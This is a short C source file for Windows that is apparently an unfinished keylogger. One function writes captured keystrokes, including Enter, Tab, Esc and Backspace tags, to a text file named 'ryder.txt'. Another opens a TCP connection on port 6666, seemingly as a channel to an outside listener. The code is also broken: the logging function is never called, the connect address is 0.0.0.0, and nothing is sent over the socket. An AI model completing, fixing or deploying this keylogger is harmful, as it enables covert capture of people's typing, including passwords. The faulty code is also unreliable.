#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define PORTNUMBA 6666 

void keyboard_magic() {
    FILE *file;
    file = fopen("ryder.txt", "w+");
    char inpuut;

    while(1) {
    if (kbhit())
    {
        inpuut = getch();
        

        switch ((int)inpuut)
        {
        case 10:
            fprintf(file, "[ENTER]");
            break;
        case 9:
            fprintf(file, "[TAB]");
            break;
        case 27:
            fprintf(file, "[ESC]");
            break;
        case 8:
            fprintf(file, "[BACKSPACE]");
            break;
        
        default:
            fputc(inpuut, file); 
            break;
        }
    }
    }
    
}

void log_my_god() {
    
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, 0);
    SOCKADDR_IN addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(PORTNUMBA);

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else
    {
        printf("C00nnected. Hit 99 if u want to disconnect");
        
    }
    
    

}

int main() {

    HWND handler;
    AllocConsole();

    handler = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(handler, SW_SHOWNORMAL);
    log_my_god();
    return 0;
}